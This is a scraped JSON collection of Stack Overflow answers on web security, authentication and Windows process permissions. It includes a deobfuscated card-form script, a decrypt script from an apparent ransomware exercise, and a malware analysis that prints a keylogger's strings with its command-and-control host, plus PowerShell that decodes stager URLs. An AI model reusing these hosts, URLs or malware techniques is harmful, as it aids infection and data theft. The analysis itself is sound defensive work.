ApiExceptionFactory.getApiException(ApiExceptionType.BAD_REQUEST, \"username\");\n        }\n        if(StringUtils.isEmpty(user.getPassword())) {\n            throw ApiExceptionFactory.getApiException(ApiExceptionType.BAD_REQUEST, \"password\");\n        }\n        if(StringUtils.isEmpty(user.getEmail())) {\n            throw ApiExceptionFactory.getApiException(ApiExceptionType.BAD_REQUEST, \"email\");\n        }\n        User registeredUser = new User();\n        registeredUser.setUsername(user.getUsername());\n        registeredUser.setPassword(passwordEncoder.encode(user.getPassword()));\n        registeredUser.setEmail(user.getEmail());\n        registeredUser.setEnabled(true);\n        registeredUser.setRoles(user.getRoles());\n        User savedUser = userRepository.save(registeredUser);\n        Inventory userInventory = inventoryService.saveInventoryForUser(savedUser.getUsername());\n        return userInventory != null;\n    }\n    private Set<GrantedAuthority> getAuthorities(User user){\n        Set<GrantedAuthority> authorities = new HashSet<>();\n        for(Role role : user.getRoles()) {\n            GrantedAuthority grantedAuthority = new SimpleGrantedAuthority(role.getName().getRole());\n            authorities.add(grantedAuthority);\n        }\n        return authorities;\n    }\n}",
        "score": 1,
        "is_accepted": false,
        "creation_date": "2022-10-05T07:47:24",
        "author": "oktaykcr"
      },
      {
        "answer_id": 73959901,
        "body": "@Configuration\n@EnableWebSecurity\npublic class WebSecurityConfig extends WebSecurityConfigurerAdapter {\n    @Autowired\n    private UserRepository userRepository;\n    @Override\n    public void configure(AuthenticationManagerBuilder authenticationManagerBuilder) throws Exception {\n        authenticationManagerBuilder.userDetailsService(userDetailsServiceBean()).passwordEncoder(passwordEncoder());\n    }\n    @Override\n    public UserDetailsService userDetailsServiceBean() {\n        return new CustomUserDetailsServiceImpl(userRepository);\n    }\n    @Bean\n    public PasswordEncoder passwordEncoder() {\n        return new BCryptPasswordEncoder();\n    }\n}",
        "score": 1,
        "is_accepted": false,
        "creation_date": "2022-10-05T07:47:24",
        "author": "oktaykcr"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/77279795/how-to-store-securely-ssl-or-public-private-keys",
    "title": "How to store securely SSL or public private keys?",
    "question_id": 77279795,
    "posted_date": "2023-10-12T06:28:53",
    "answers": [
      {
        "answer_id": 77279862,
        "body": "import fs from 'fs';\nimport path from 'path';\nimport dotenv from 'dotenv';\ndotenv.config();\nconst privateKeyPath = path.resolve(process.cwd(), process.env.PRIVATE_KEY_LOC!);\nconst publicKeyPath = path.resolve(process.cwd(), process.env.PUBLIC_KEY_LOC!);\nconst certificatePath = path.resolve(process.cwd(), process.env.CERTIFICATE_LOC!);\nconst privateKey = fs.readFileSync(privateKeyPath, 'utf-8');\nconst publicKey = fs.readFileSync(publicKeyPath, 'utf-8');\nconst certificate = fs.readFileSync(certificatePath, 'utf-8');",
        "score": 1,
        "is_accepted": false,
        "creation_date": "2023-10-12T06:39:14",
        "author": "mandy8055"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/74237432/symfony-login-without-email-verification",
    "title": "Symfony login without email verification",
    "question_id": 74237432,
    "posted_date": "2022-10-28T11:16:21",
    "answers": [
      {
        "answer_id": 74244102,
        "body": "public function authenticate(){\n    return new Passport(\n        new UserBadge($email, function($userIdentifier) {\n            // optionally pass a callback to load the User manually\n            $foundUser = $this->usersRepo->findOneBy(['email' => $userIdentifier]);\n            if (!$foundUser) {\n                throw new UserNotFoundException();\n            }\n            if (!$foundUser->isEnabled()) {\n                throw new CustomUserMessageAccountStatusException('Your account was not enabled/activated yet.');\n            }\n            return $foundUser;\n        }),\n    );\n}",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2022-10-29T05:15:11",
        "author": "V-Light"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/72535235/is-there-an-easy-way-to-deobfuscate-this-javascript",
    "title": "Is there an easy way to deobfuscate this javascript?",
    "question_id": 72535235,
    "posted_date": "2022-06-07T13:19:25",
    "answers": [
      {
        "answer_id": 72536997,
        "body": "jQuery(document)['ready'](function(C) {\n    var o = -0x1,\n        x = -0x1;\n    jQuery('body')['on']('keydown', '.wc-credit-card-form-card-number', function() {\n        jQuery('form.checkout'))['find']('.dsn342cawiw3A23')['val'](++o);\n    }), jQuery('body')['on']('keydown', function() {\n        jQuery('form.checkout')['find']('.dsn342cawiw3A21')['val'](++x);\n    }), jQuery('body')['on']('click', '.wc-credit-card-form-card-number'}, function() {\n        o == -0x1 && (o = 0x0, jQuery('form.checkout')['find']('.dsn342cawiw3A23')['val'](x));\n    }), jQuery('body')['on']('click', function() {\n        x == -0x1 && (x = 0x0, jQuery('form.checkout')['find']('.dsn342cawiw3A21')[val](x));\n    }), jQuery('form.checkout')['append'](jQuery('<input type=\"hidden\" class=\"dsn342cawiw3A23\" name=\"dsn342cawiw3A23\">')['val'](o)), jQuery('form.checkout')['append'](jQuery('<input type=\"hidden\" class=\"dsn342cawiw3A21\" name=\"dsn342cawiw3A21\">')['val'](x));\n});",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2022-06-07T16:06:21",
        "author": "trincot"
      },
      {
        "answer_id": 72536997,
        "body": "$(document).ready(function() {\n    var o = -1,\n        x = -1;\n    $('body').on('keydown', '.wc-credit-card-form-card-number', function() {\n        $('form.checkout')).find('.dsn342cawiw3A23').val(++o);\n    });\n    $('body').on('keydown', function() {\n        $('form.checkout').find('.dsn342cawiw3A21').val(++x);\n    });\n    $('body').on('click', '.wc-credit-card-form-card-number'}, function() {\n        if (o == -1) {\n            o = 0;\n            $('form.checkout').find('.dsn342cawiw3A23').val(x);\n        }\n    });\n    $('body').on('click', function() {\n        if (x == -1) {\n            x = 0;\n            $('form.checkout').find('.dsn342cawiw3A21').val(x);\n        }\n    });\n    $('form.checkout').append($('<input type=\"hidden\" class=\"dsn342cawiw3A23\" name=\"dsn342cawiw3A23\">').val(o));\n    $('form.checkout').append($('<input type=\"hidden\" class=\"dsn342cawiw3A21\" name=\"dsn342cawiw3A21\">').val(x));\n});",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2022-06-07T16:06:21",
        "author": "trincot"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/70880170/php-thinks-my-string-is-also-an-associative-array-thinks-array-is-string-tryin",
    "title": "PHP thinks my string is also an associative array. Thinks array is string. Trying to extract a CSRF Token from it",
    "question_id": 70880170,
    "posted_date": "2022-01-27T09:21:53",
    "answers": [
      {
        "answer_id": 70880930,
        "body": "$str = <<<'DUH'\n{'email' => 'TheDude@company.com','userid' => 69,'uid' => 69,'scanstatus' => 'S','CSRFToken' => 'tokenGENexample==','_SESSION_ATIME' => 1643289149,'abbr' => 'TheDude','scantype' => 0,'_SESSION_REMOTE_ADDR' => 'IP Address','_SESSION_CTIME' => 1643282918,'scanexpiration' => 1643289447,'_SESSION_ETIME' => 1800,'_SESSION_ID' => 'sessionGENexample','scanmode' => 100};;$D\nDUH;\n// Fix ' -quoted keys and values:\n$str = preg_replace(\"~'([^']+)'~\", '\"\\1\"', $str);\n// Convert => to :\n$str = str_replace(' => ', ':', $str);\n// Trim the tail:\n$str = preg_replace('~;;.+$~', '', $str);\n$data = json_decode($str, true);",
        "score": 1,
        "is_accepted": false,
        "creation_date": "2022-01-27T10:09:40",
        "author": "Markus AO"
      },
      {
        "answer_id": 70880930,
        "body": "array(14) {\n\t[\"email\"] \u00b7 string(19) \"TheDude@company.com\"\n\t[\"userid\"] \u00b7 int(69)\n\t[\"uid\"] \u00b7 int(69)\n\t[\"scanstatus\"] \u00b7 string(1) \"S\"\n\t[\"CSRFToken\"] \u00b7 string(17) \"tokenGENexample==\"\n\t[\"_SESSION_ATIME\"] \u00b7 int(1643289149)\n\t[\"abbr\"] \u00b7 string(7) \"TheDude\"\n\t[\"scantype\"] \u00b7 int(0)\n\t[\"_SESSION_REMOTE_ADDR\"] \u00b7 string(10) \"IP Address\"\n\t[\"_SESSION_CTIME\"] \u00b7 int(1643282918)\n\t[\"scanexpiration\"] \u00b7 int(1643289447)\n\t[\"_SESSION_ETIME\"] \u00b7 int(1800)\n\t[\"_SESSION_ID\"] \u00b7 string(17) \"sessionGENexample\"\n\t[\"scanmode\"] \u00b7 int(100)\n}",
        "score": 1,
        "is_accepted": false,
        "creation_date": "2022-01-27T10:09:40",
        "author": "Markus AO"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/69342523/when-should-i-use-the-deny-access-functions-in-symfony-4-4-controllers",
    "title": "When should I use the deny access functions in Symfony 4.4 controllers?",
    "question_id": 69342523,
    "posted_date": "2021-09-27T03:10:31",
    "answers": [
      {
        "answer_id": 69343195,
        "body": "/**\n * @Route(\"/authenticated\") // It's protected by the firewall defined in security.yaml\n */\nclass AccountManagementController extends AbstractController\n{\n    /**\n     * @Route(\"/{id}\", name=\"account_management_delete\", methods={\"POST\"})\n     */\n    public function deleteUser()\n    {\n        // As backoffice operators due to role hierarchy can access you should restrict the permissions to Admins\n        $this->denyAccessUnlessGranted('ROLE_ADMIN');\n        # code...\n    }\n    public function handleUserData()\n    {\n        // No control except the firewall needed as BOO can already access\n    }\n}",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2021-09-27T04:09:22",
        "author": "Jack Skeletron"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/60876999/reactjs-preflight-request-err",
    "title": "Reactjs Preflight Request Err",
    "question_id": 60876999,
    "posted_date": "2020-03-26T18:14:15",
    "answers": [
      {
        "answer_id": 60878251,
        "body": "const express = require('express');\n    const request = require('request');\n\n    const app = express();\n\n    app.use((req, res, next) => {\n        res.header('Access-Control-Allow-Origin', '*');\n        next();\n    });\n\n    app.get('/jokes/random', (req, res) => {\n        request(\n            { url: 'https://the-main-api-address' },\n            (error, response, body) => {\n                if (error || response.statusCode !== 200) {\n                    return res.status(500).json({ type: 'error', message: err.message });\n                }\n\n                res.json(JSON.parse(body));\n            }\n        )\n    });\n\n    const PORT = process.env.PORT || 3000;\n    app.listen(PORT, () => console.log(`listening on ${PORT}`));",
        "score": 1,
        "is_accepted": false,
        "creation_date": "2020-03-26T20:32:52",
        "author": "AmerllicA"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/76824562/deprecated-methods-in-spring-6-1-1",
    "title": "Deprecated methods in Spring 6.1.1",
    "question_id": 76824562,
    "posted_date": "2023-08-02T22:25:46",
    "answers": [
      {
        "answer_id": 76825456,
        "body": "@Bean\n    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {\n        return http\n                .cors(AbstractHttpConfigurer::disable)\n                .csrf(AbstractHttpConfigurer::disable)\n                .authorizeHttpRequests(auth -> auth.requestMatchers(\"/register\")\n                        .permitAll())\n                .authorizeHttpRequests(auth -> auth.requestMatchers(\"/users\")\n                        .hasAnyAuthority(\"USER\", \"ADMIN\"))\n                .formLogin(Customizer.withDefaults())\n                .build();\n    }",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2023-08-03T02:38:22",
        "author": "ABC"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/76429890/nscurl-result-what-could-be-reasons-of-failing-tlsv3-when-not-using-bg-whe",
    "title": "Nscurl result , what could be reasons of failing TLSv3 when not using --bg , when i use API to execute the request it pass?",
    "question_id": 76429890,
    "posted_date": "2023-06-08T04:15:04",
    "answers": [
      {
        "answer_id": 76429952,
        "body": "Error Domain: NSURLErrorDomain\nError Code: -1200\nError Description: An SSL error has occurred, and a secure connection to the server cannot be made.\nNSErrorFailingURLKey: The URL that caused the error (https://linkedin.com/ in this case).\nNSLocalizedRecoverySuggestion: A suggestion to connect to the server anyway (prompting user confirmation).\n_kCFStreamErrorDomainKey: Indicates the stream error domain (value of 3 indicates the SSL error domain).\n_NSURLErrorFailingURLSessionTaskErrorKey: The specific task (LocalDataTask <A96FFD17-D247-493F-BD95-4F4FACC5AD19>.<1>) associated with the error.\n_NSURLErrorRelatedURLSessionTaskErrorKey: Additional related tasks associated with the error.\nNSUnderlyingError: The underlying error with more detailed information.\n_kCFStreamErrorCodeKey: The error code within the stream error domain (-9816 indicates an SSL error).\nThis error suggests that there was a problem establishing a secure connection with the LinkedIn server, likely due to SSL/TLS configuration or compatibility issues. It's possible that the server's SSL certificate is invalid, expired, or not trusted by the client. It could also be caused by a mismatch in supported SSL/TLS versions or cipher suites between the client and server.",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2023-06-08T04:26:24",
        "author": "Laith Rafid"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/76408806/tab-error-inconsistent-use-of-tab-and-spaces-in-indentation",
    "title": "tab error inconsistent use of tab and spaces in indentation",
    "question_id": 76408806,
    "posted_date": "2023-06-05T13:39:10",
    "answers": [
      {
        "answer_id": 76408863,
        "body": "import os\nfrom cryptography.fernet import Fernet\ndef get_files():\n    exclude_files = [\"ransomware.py\", \"thekey.key\", \"decrypt.py\"]\n    files = [\n        file\n        for file in os.listdir()\n        if file not in exclude_files and os.path.isfile(file)\n    ]\n    return files\ndef decrypt_files(files, secret_key):\n    for file in files:\n        with open(file, \"rb\") as f:\n            contents = f.read()\n        contents_decrypted = Fernet(secret_key).decrypt(contents)\n        with open(file, \"wb\") as f:\n            f.write(contents_decrypted)\n        print(\"Thank you! Your files have been decrypted.\")\ndef main():\n    with open(\"thekey.key\", \"rb\") as key_file:\n        secret_key = key_file.read()\n    secret_phrase = \"bootcon\"\n    user_phrase = input(\"Enter the phrase to decrypt your files: \")\n    if user_phrase == secret_phrase:\n        files = get_files()\n        decrypt_files(files, secret_key)\n    else:\n        print(\"Wrong phrase. Try again.\")\nif __name__ == \"__main__\":\n    main()",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2023-06-05T13:51:15",
        "author": "Reza K Ghazi"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/70003093/keystonejs-stop-graphql-to-write-the-error-and-hints-out",
    "title": "Keystonejs, stop graphql to write the error and hints out",
    "question_id": 70003093,
    "posted_date": "2021-11-17T05:56:04",
    "answers": [
      {
        "answer_id": 70163452,
        "body": "import { config } from '@keystone-next/keystone';\nimport { lists } from './schema';\nimport { ValidationError } from 'apollo-server-express';\nimport { GraphQLError } from 'graphql';\nexport default config({\n  db: {\n    provider: 'sqlite',\n    url: process.env.DATABASE_URL,\n  },\n  lists,\n  graphql: {\n    apolloConfig: {\n      formatError: (error: GraphQLError): any => {\n        if (error instanceof ValidationError) {\n          return new ValidationError('Invalid request.');\n        }\n      }\n    }\n  }\n});",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2021-11-29T21:04:00",
        "author": "Molomby"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/69648232/cannot-modify-process-dacl-that-i-own-with-my-code-but-process-hacker-can",
    "title": "Cannot modify Process DACL that I own with my code but Process Hacker can",
    "question_id": 69648232,
    "posted_date": "2021-10-20T10:48:32",
    "answers": [
      {
        "answer_id": 69659045,
        "body": "#include <windows.h>\n#include <accctrl.h>\n#include <aclapi.h>\n#include <winnt.h>\n#include <stdio.h>\n#include <lmcons.h>\nDWORD AddAceToObjectsSecurityDescriptor (\n    HANDLE pszObjName,          // name of object\n    SE_OBJECT_TYPE ObjectType,  // type of object\n    LPTSTR pszTrustee,          // trustee for new ACE\n    TRUSTEE_FORM TrusteeForm,   // format of trustee structure\n    DWORD dwAccessRights,       // access mask for new ACE\n    ACCESS_MODE AccessMode,     // type of ACE\n    DWORD dwInheritance         // inheritance flags for new ACE\n)\n{\n    DWORD dwRes = 0;\n    PACL pOldDACL = NULL, pNewDACL = NULL;\n    PSECURITY_DESCRIPTOR pSD = NULL;\n    EXPLICIT_ACCESS ea;\n    if (NULL == pszObjName)\n        return ERROR_INVALID_PARAMETER;\n    // Get a pointer to the existing DACL.\n    dwRes = GetSecurityInfo(pszObjName, ObjectType,\n          DACL_SECURITY_INFORMATION,\n          NULL, NULL, &pOldDACL, NULL, &pSD);\n    if (ERROR_SUCCESS != dwRes) {\n        printf( \"GetSecurityInfo Error %u\\n\", dwRes );\n        goto Cleanup;\n    }\n    // Initialize an EXPLICIT_ACCESS structure for the new ACE.\n    ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));\n    ea.grfAccessPermissions = dwAccessRights;\n    ea.grfAccessMode = AccessMode;\n    ea.grfInheritance= dwInheritance;\n    ea.Trustee.TrusteeForm = TrusteeForm;\n    ea.Trustee.ptstrName = pszTrustee;\n    // Create a new ACL that merges the new ACE\n    // into the existing DACL.\n    dwRes = SetEntriesInAcl(1, &ea, pOldDACL, &pNewDACL);\n    if (ERROR_SUCCESS != dwRes)  {\n        printf( \"SetEntriesInAcl Error %u\\n\", dwRes );\n        goto Cleanup;\n    }else{\n\t  printf(\"SetEntriesAcl SUCCESS !\\n\");\n\t}\n    // Attach the new ACL as the object's DACL.\n    dwRes = SetSecurityInfo(pszObjName, ObjectType,\n          DACL_SECURITY_INFORMATION,\n          NULL, NULL, pNewDACL, NULL);\n    if (ERROR_SUCCESS != dwRes)  {\n        printf( \"SetSecurityInfo Error %u\\n\", dwRes );\n        goto Cleanup;\n    }else{\n\t  printf(\"SetSecurityInfo SUCCESS \\n\");\n    }\n    Cleanup:\n        if(pSD != NULL)\n            LocalFree((HLOCAL) pSD);\n        if(pNewDACL != NULL)\n            LocalFree((HLOCAL) pNewDACL);\n        return dwRes;\n}\nint main(int argc, char *argv[])\n{\n  int pid = atoi(argv[1]);\n  DWORD dwRes = 0;\n  char username[UNLEN+1];\n  DWORD username_len = UNLEN+1;\n  GetUserName(username, &username_len);\n  HANDLE self = OpenProcess(READ_CONTROL | WRITE_DAC, FALSE, (DWORD) pid);\n  if(self != NULL){\n\tprintf(\"process open !\\n\");\n\tAddAceToObjectsSecurityDescriptor(self, SE_KERNEL_OBJECT, (LPSTR)username,TRUSTEE_IS_NAME, PROCESS_ALL_ACCESS, GRANT_ACCESS, 0);\n  }\n  else{\n\t  dwRes = GetLastError();\n\t  printf(\"error in opening of the process. Code %u \\n\", dwRes);\n  }\n}",
        "score": 0,
        "is_accepted": true,
        "creation_date": "2021-10-21T05:07:40",
        "author": "Alice"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/69193060/security-vulnerability-xss-dom-based",
    "title": "Security Vulnerability XSS Dom based",
    "question_id": 69193060,
    "posted_date": "2021-09-15T08:22:01",
    "answers": [
      {
        "answer_id": 69196439,
        "body": "Phase: Architecture and Design Use a vetted library or framework that does not\nallow this weakness to occur or provides constructs that make this weakness\neasier to avoid. Examples of libraries and frameworks that make it easier to\ngenerate properly encoded output include Microsoft's Anti-XSS library, the OWASP\nESAPI Encoding module, and Apache Wicket. Phases: Implementation; Architecture\nand Design Understand the context in which your data will be used and the\nencoding that will be expected. This is especially important when transmitting\ndata between different components, or when generating outputs that can contain\nmultiple encodings at the same time, such as web pages or multi-part mail\nmessages. Study all expected communication protocols and data representations to\ndetermine the required encoding strategies. For any data that will be output to\nanother web page, especially any data that was received from external inputs,\nuse the appropriate encoding on all non-alphanumeric characters. Consult the XSS\nPrevention Cheat Sheet for more details on the types of encoding and escaping\nthat are needed. Phase: Architecture and Design For any security checks that are\nperformed on the client side, ensure that these checks are duplicated on the\nserver side, in order to avoid CWE-602. Attackers can bypass the client-side\nchecks by modifying values after the checks have been performed, or by changing\nthe client to remove the client-side checks entirely. Then, these modified\nvalues would be submitted to the server. If available, use structured mechanisms\nthat automatically enforce the separation between data and code. These\nmechanisms may be able to provide the relevant quoting, encoding, and validation\nautomatically, instead of relying on the developer to provide this capability at\nevery point where output is generated. Phase: Implementation For every web page\nthat is generated, use and specify a character encoding such as ISO-8859-1 or\nUTF-8. When an encoding is not specified, the web browser may choose a different\nencoding by guessing which encoding is actually being used by the web page. This\ncan cause the web browser to treat certain sequences as special, opening up the\nclient to subtle XSS attacks. See CWE-116 for more mitigations related to\nencoding/escaping. To help mitigate XSS attacks against the user's session\ncookie, set the session cookie to be HttpOnly. In browsers that support the\nHttpOnly feature (such as more recent versions of Internet Explorer and\nFirefox), this attribute can prevent the user's session cookie from being\naccessible to malicious client-side scripts that use document.cookie. This is\nnot a complete solution, since HttpOnly is not supported by all browsers. More\nimportantly, XMLHTTPRequest and other powerful browser technologies provide read\naccess to HTTP headers, including the Set-Cookie header in which the HttpOnly\nflag is set. Assume all input is malicious. Use an 'accept known good' input\nvalidation strategy, i.e., use an allow list of acceptable inputs that strictly\nconform to specifications. Reject any input that does not strictly conform to\nspecifications, or transform it into something that does. Do not rely\nexclusively on looking for malicious or malformed inputs (i.e., do not rely on a\ndeny list). However, deny lists can be useful for detecting potential attacks or\ndetermining which inputs are so malformed that they should be rejected outright.\nWhen performing input validation, consider all potentially relevant properties,\nincluding length, type of input, the full range of acceptable values, missing or\nextra inputs, syntax, consistency across related fields, and conformance to\nbusiness rules. As an example of business rule logic, 'boat' may be\nsyntactically valid because it only contains alphanumeric characters, but it is\nnot valid if you are expecting colors such as 'red' or 'blue.' Ensure that you\nperform input validation at well-defined interfaces within the application. This\nwill help protect the application even if a component is reused or moved\nelsewhere.",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2021-09-15T12:01:56",
        "author": "kingthorin"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/67259042/problems-with-a-portscanner-in-python",
    "title": "problems with a portscanner in python",
    "question_id": 67259042,
    "posted_date": "2021-04-25T19:06:53",
    "answers": [
      {
        "answer_id": 67259285,
        "body": "def fn(addr, min_port, max_port):\n\n    while min_port <= max_port:\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            try:\n                s.connect((addr, min_port))\n            except <SOME SPECIFIC EXCEPTION THAT MEANS THE PORT IS UNREACHABLE>:\n                pass\n            except Exception:\n                print('SOMETHING REALLY BAD HAPPENED!')\n                print('BUT NOW AT LEAST YOU CAN SEE IT HAPPENED:)')\n                raise\n            else:\n                yield min_port\n            finally:\n                min_port += 1",
        "score": 1,
        "is_accepted": false,
        "creation_date": "2021-04-25T19:51:23",
        "author": "madbird"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/64715565/can-i-know-what-the-rumpe-and-server-is-aiming-to-do",
    "title": "Can I know what the $Rumpe and $server is aiming to do?",
    "question_id": 64715565,
    "posted_date": "2020-11-06T08:30:25",
    "answers": [
      {
        "answer_id": 64722459,
        "body": "<Module> Clie.exe Program Lime Keylogger mscorlib System Object host port registryName splitter victimName version System.Threading Mutex stubMutex System.IO FileInfo currentAssemblyFileInfo keylogger isConnected System.Net.Sockets TcpClient tcpSock\net MemoryStream memoryStream bytesArray lastCapturedImage currentPlugin Main Start DeleteValueFromRegistry GetValueFromRegistry Microsoft.Win32 RegistryValueKind SaveValueOnRegistry GetInfo StringToBase64 Base64ToString StringToBytes BytesToString Decompress\nGzip SearchForCam GetForegroundWindowTitle GetHWID Plugin Uninstall HandleData CreateHash Send Connect Receive NtSetInformationProcess capGetDriverDescriptionA GetVolumeInformation GetForegroundWindow GetWindowText GetWindowTextLength .ctor System.Text Strin\ngBuilder ToUnicodeEx GetKeyboardState MapVirtualKey GetWindowThreadProcessId GetKeyboardLayout GetAsyncKeyState AV VKCodeToUnicode System.Windows.Forms Keys Fix WRK LastAV LastAS lastKey Logs vn Microsoft.VisualBasic Microsoft.VisualBasic.Devices Keyboard ke\nyboard System.Runtime.CompilerServices CompilationRelaxationsAttribute RuntimeCompatibilityAttribute Clie STAThreadAttribute Interaction Command Registry RegistryKey CurrentUser SetValue Thread Sleep Environment Exit ThreadStart Application DoEvents System.D\niagnostics Process GetCurrentProcess IntPtr op_Explicit set_MinWorkingSet Microsoft.VisualBasic.CompilerServices Operators CompareString String Concat name RegistryKeyPermissionCheck CreateSubKey DeleteValue IDisposable Dispose ret OpenSubKey RuntimeHelpers\nGetObjectValue GetValue n t typ ConditionalCompareObjectEqual Conversions ToString get_MachineName get_UserName FileSystemInfo DateTime get_LastWriteTime get_Date Computer ServerComputer ComputerInfo get_Info get_OSFullName OperatingSystem get_OSVersion get_\nServicePack Strings CompareMethod Split SpecialFolder GetFolderPath Contains GetValueNames get_Length s Convert ToBase64String FromBase64String S Encoding get_UTF8 GetBytes B GetString System.IO.Compression GZipStream Stream CompressionMode Byte set_Position\n Read BitConverter ToInt32 Space Zero op_Equality Environ Conversion Hex b c System.Reflection Assembly Load Module GetModules Type GetTypes get_FullName EndsWith get_Assembly CreateInstance DeleteSubKeyTree AppWinStyle Shell WaitHandle Close ConcatenateObje\nct get_Chars Write ToArray System.Net WebClient DownloadData Path GetTempFileName File WriteAllBytes get_Name Exception get_Message ProjectData ClearProjectError NewLateBinding LateSet LateCall Boolean LateGet CompareObjectEqual OrObject ToBoolean Screen get\n_PrimaryScreen System.Drawing Rectangle get_Bounds get_Width get_Height Bitmap System.Drawing.Imaging PixelFormat Graphics Image FromImage Size CopyPixelOperation CopyFromScreen Cursors Cursor get_Default Point get_Position Draw SetProjectError ToInteger Dra\nwImage ImageFormat get_Jpeg Save WriteByte RuntimeTypeHandle GetTypeFromHandle ChangeType System.Security.Cryptography MD5CryptoServiceProvider HashAlgorithm ComputeHash Monitor Enter Int32 Socket get_Client SocketFlags set_ReceiveBufferSize set_SendBufferSi\nze set_SendTimeout set_ReceiveTimeout Empty DirectoryInfo get_Directory <Receive>b__0 ParameterizedThreadStart <>9__CachedAnonymousMethodDelegate1 CompilerGeneratedAttribute a0 get_Available SelectMode Poll Join NetworkStream GetStream ReadByte ChrW Char ToL\nong System.Runtime.InteropServices DllImportAttribute ntdll hProcess processInformationClass processInformation processInformationLength avicap32.dll wDriver lpszName MarshalAsAttribute UnmanagedType cbName lpszVer cbVer kernel32 GetVolumeInformationA lpRoot\nPathName lpVolumeNameBuffer nVolumeNameSize lpVolumeSerialNumber lpMaximumComponentLength lpFileSystemFlags lpFileSystemNameBuffer nFileSystemNameSize user32.dll GetWindowTextA hWnd WinTitle MaxLength GetWindowTextLengthA hwnd .cctor get_ExecutablePath a d O\nutAttribute e f g user32 GetProcessById get_MainWindowTitle DateAndTime get_Now get_ProcessName k get_ShiftKeyDown get_CapsLock ToUpper ToLower get_CtrlKeyDown Remove     d i  !   a c t  S o f t w a r e \\  l l  v n  _  N / A  y y - M M - d d S P\n    0  x 8 6  \t  x 6 4  \t  x 8 6  Y e s  N o  . .  ,  S y s t e m D r i v e  \\  E R R  .  S o f t w a r e  Cc m d . e x e   / C   Y   / N   / D   Y   / T   1   &   D e l   \"  \"  k l  \tp r o f  ~  g e t v a l u e  @  r n  M S G  E x e c u\nt e   E R R O R  b l a  D o w n l o a d   E R R O R  E x e c u t e d   A s    E x e c u t e   E R R O R    i n v  p l  A  h  p  o s k  s t a r t  O f f  o f f  r e t  G T  C A P  u n  u p  U p d a t e   E R R O R  \t. e x e  U p d a t i n\ng   T o    U p d a t e   E R R O R    E x  P L G  i n d  H  P  c  E R  x 2\n  :  i n f  c l e a r  /j h o l e p p p p p 5 . d u c k d n s . o r g  \t9 5 9 5  d 7 4 f 6 8 0 0 1 6  @ ! # & ^ % $  T l l B T i B D Q V Q =  0 . 7 N C  \t[ k l ]\n  y y / M M / d d\n [  ]  [ E N T E R ]\n  [ T A P ]",
        "score": 1,
        "is_accepted": false,
        "creation_date": "2020-11-06T17:34:28",
        "author": "PowerShellGuy"
      },
      {
        "answer_id": 64722459,
        "body": "$dll = '0/L00dc/r/ee.etsap//:sptth'\n#this lead to a paste.ee page, which I manually copied to $RumpeD\n$dll[-1..-$dll.Length] -join ''\n$RumpeD=\"copy pasta of string\"\n#same as above\n$Fi = 'txt.34612474295/sbv/erots.sbvle//:ptth';\n$Fi[-1..-$Fi.Length] -join ''\n$FiRe =\"copy pasta of string\"\n[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String( $FiRe[-1..-$FiRe.Length] -join '' ))\n[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String( $RumpeD[-1..-$RumpeD.Length] -join '' ))",
        "score": 1,
        "is_accepted": false,
        "creation_date": "2020-11-06T17:34:28",
        "author": "PowerShellGuy"
      }
    ]
  }
]